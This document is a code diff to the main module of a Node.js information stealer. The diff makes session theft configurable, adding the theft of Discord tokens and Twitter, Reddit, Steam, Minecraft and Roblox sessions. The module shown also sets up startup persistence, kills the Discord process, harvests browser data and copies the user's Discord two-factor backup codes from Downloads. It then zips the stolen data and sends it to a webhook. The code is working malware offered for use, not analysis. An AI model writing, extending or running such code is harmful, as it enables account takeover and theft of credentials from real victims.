@@ -5,6 +5,7 @@ const os = require('os');
 const { execSync, spawnSync } = require('child_process');
 const { copyFileSync, existsSync, mkdtempSync, createWriteStream } = require('fs');
 const axios = require('axios');
+const { twitter, reddit, steam, roblox, minecraft } = require('../functions/steal-sessions');
 
 let tempFolder = '';
 
@@ -29,17 +30,22 @@ module.exports = async () => {
   await sleep(500);
 
   if (config.addToStartup && runningFromExecutable()) require('../functions/startup');
-  config.discord.killProcess && require('../functions/kill-discord');
-  require('../functions/grab-mc');
+  if (config.discord.killProcess) require('../functions/kill-discord');
   await require('../functions/grab-browsers-data');
-  await require('../functions/grab-roblox')();
-  require('../functions/steal-sessions');
+
+  if (config.sessionStealing) {
+    if (config.sessionStealing.discord) await require('../functions/grab-discord-token');
+    if (config.sessionStealing.twitter) await twitter();
+    if (config.sessionStealing.reddit) await reddit();
+    if (config.sessionStealing.steam) await steam();
+    if (config.sessionStealing.minecraft) await minecraft();
+    if (config.sessionStealing.roblox) await roblox();
+  }
 
   const mfaCodesPath = join(os.homedir(), 'Downloads', 'discord_backup_codes.txt');
   if (existsSync(mfaCodesPath)) {
     copyFileSync(mfaCodesPath, join(tempFolder, 'Discord 2FA Backup Codes.txt'));
   }
-  await require('../functions/grab-discord-token');
   await sleep(500);
   require('../functions/zip').then(await (require('../functions/webhook')));
 
